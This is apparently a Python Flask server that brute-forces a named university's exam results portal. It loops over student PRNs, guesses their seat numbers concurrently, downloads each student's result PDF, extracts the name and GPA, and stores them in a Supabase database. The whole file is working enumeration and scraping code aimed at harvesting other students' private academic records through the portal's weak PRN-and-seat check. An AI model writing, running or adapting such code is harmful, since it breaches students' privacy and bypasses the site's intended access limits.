import os
import requests
import io
import re
import pdfplumber
import concurrent.futures
import threading
from flask import Flask, jsonify, request
from flask_cors import CORS
from supabase import create_client, Client
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app) # Allow React frontend to access

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

if SUPABASE_URL and SUPABASE_KEY:
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
else:
    supabase = None

BASE_URL = "https://siuexam.siu.edu.in"
SEASON = "April 2026"
YEAR = 2026
DEPARTMENT = "CSE"
SEMESTER = 3

# We don't need 50 workers anymore since we only test ~10 seats!
WORKER_COUNT = 10 

# Global State
state = {
    "is_running": False,
    "should_stop": False,
    "current_prn": 0,
    "total_prns": 0,
    "logs": []
}

def log_msg(msg):
    print(msg)
    state["logs"].append(msg)
    if len(state["logs"]) > 100:
        state["logs"].pop(0)

def extract_from_memory(pdf_content):
    try:
        with pdfplumber.open(io.BytesIO(pdf_content)) as pdf:
            text = pdf.pages[0].extract_text()
            name = "Unknown"
            if text:
                match = re.search(r"NAME\s*:\s*([^\n\r]*)", text, re.IGNORECASE)
                name = match.group(1).strip() if match else "Unknown"
            gpa = "N/A"
            nums = re.findall(r"(\d+\.\d+)", text)
            for num in reversed(nums):
                if 0.1 <= float(num) <= 10.0:
                    gpa = num
                    break
            return name, gpa
    except: 
        return "Error", "N/A"

def check_seat(prn, seat):
    if state["should_stop"]: return None
    try:
        session = requests.Session()
        
        # We MUST call DspSeatnum first to initialize the server-side session cookie
        verify_url = f"{BASE_URL}/rsstd/DspSeatnum"
        verify_params = {"dbnm": "siucore", "prn": prn, "mksea": SEASON}
        res_verify = session.get(verify_url, params=verify_params, timeout=10)
        
        if "Please contact your institute" in res_verify.text or "not yet declared" in res_verify.text:
            return {"status": "TNG", "seat": seat}

        view_url = f"{BASE_URL}/rsstd/viewrslt"
        view_params = {"dbnm": "siucore", "mrkexmid": 3, "siudbnm": "Ff2CU4Z5nA==", "seatno": seat, "p": prn, "se": SEASON}
        res_view = session.get(view_url, params=view_params, timeout=10)
        
        if "Enter valid Seat No.!!" not in res_view.text and "Please enter valid PRN and seat no !!" not in res_view.text:
            soup = BeautifulSoup(res_view.text, "html.parser")
            btn = soup.find("a", class_="btndef")
            if btn and "href" in btn.attrs:
                pdf_url = btn["href"].replace("../../", BASE_URL + "/")
                pdf_res = session.get(pdf_url, timeout=10)
                name, gpa = extract_from_memory(pdf_res.content)
                return {"status": "SUCCESS", "name": name, "gpa": gpa, "seat": seat}
    except Exception as e:
        pass
    return None

def save_to_supabase(record):
    if not supabase: return
    try:
        supabase.table("results").upsert(record).execute()
    except Exception as e:
        log_msg(f"Failed to save {record['prn']} to DB: {e}")

def scraper_loop(start_prn, end_prn, initial_seat=None):
    log_msg(f"Started SMART Scraper with mathematical offset tracking...")
    state["total_prns"] = end_prn - start_prn + 1
    
    # Calculate initial offset if provided
    current_offset = None
    if initial_seat:
        current_offset = initial_seat - start_prn
        log_msg(f"Baseline Offset locked: {current_offset}")

    for prn in range(start_prn, end_prn + 1):
        if state["should_stop"]:
            log_msg("Scraper stopped by user.")
            break

        state["current_prn"] = prn - start_prn + 1
        found = False
        
        # SMART SEARCH WINDOW
        batch = []
        if current_offset is not None:
            predicted_seat = prn + current_offset
            # Test a tight window of +/- 5 around prediction
            batch = [predicted_seat]
            for i in range(1, 6):
                batch.append(predicted_seat + i)
                batch.append(predicted_seat - i)
        else:
            # Fallback if no offset known: just test the full pool
            batch = list(range(528501, 530000))
        
        # Run the search window concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = {executor.submit(check_seat, prn, s): s for s in batch}
            results = []
            for f in concurrent.futures.as_completed(futures):
                res = f.result()
                if res: results.append(res)
            
            for res in results:
                if res["status"] == "SUCCESS":
                    log_msg(f"PRN: {prn} | Seat: {res['seat']} | Name: {res['name']} | GPA: {res['gpa']}")
                    save_to_supabase({"prn": prn, "name": res['name'], "seat": str(res['seat']), "gpa": res['gpa'], "year": YEAR, "department": DEPARTMENT, "semester": SEMESTER})
                    found = True
                    # UPDATE OFFSET for next prediction!
                    current_offset = res['seat'] - prn
                    break
        
        if not found and not state["should_stop"]:
            log_msg(f"PRN: {prn} | FAIL - Student dropped out or invalid")
            save_to_supabase({"prn": prn, "name": "Not Found", "seat": "N/A", "gpa": "N/A", "year": YEAR, "department": DEPARTMENT, "semester": SEMESTER})

    state["is_running"] = False
    if not state["should_stop"]:
        log_msg("[FINISH] Smart Scraping Complete.")

@app.route('/api/start', methods=['POST'])
def start_scraper():
    if state["is_running"]:
        return jsonify({"message": "Already running"}), 400
    
    data = request.json or {}
    start_prn = int(data.get("start_prn", 24070122001))
    end_prn = int(data.get("end_prn", 24070122200))
    initial_seat = data.get("start_seat")
    if initial_seat:
        initial_seat = int(initial_seat)

    state["is_running"] = True
    state["should_stop"] = False
    state["logs"] = []
    
    thread = threading.Thread(target=scraper_loop, args=(start_prn, end_prn, initial_seat))
    thread.start()
    return jsonify({"message": "Scraper started"})

@app.route('/api/stop', methods=['POST'])
def stop_scraper():
    if not state["is_running"]:
        return jsonify({"message": "Not running"}), 400
    
    state["should_stop"] = True
    return jsonify({"message": "Stopping..."})

@app.route('/api/status', methods=['GET'])
def get_status():
    return jsonify(state)

if __name__ == '__main__':
    log_msg("SMART API Server initialized. Waiting for commands...")
    app.run(port=5000)
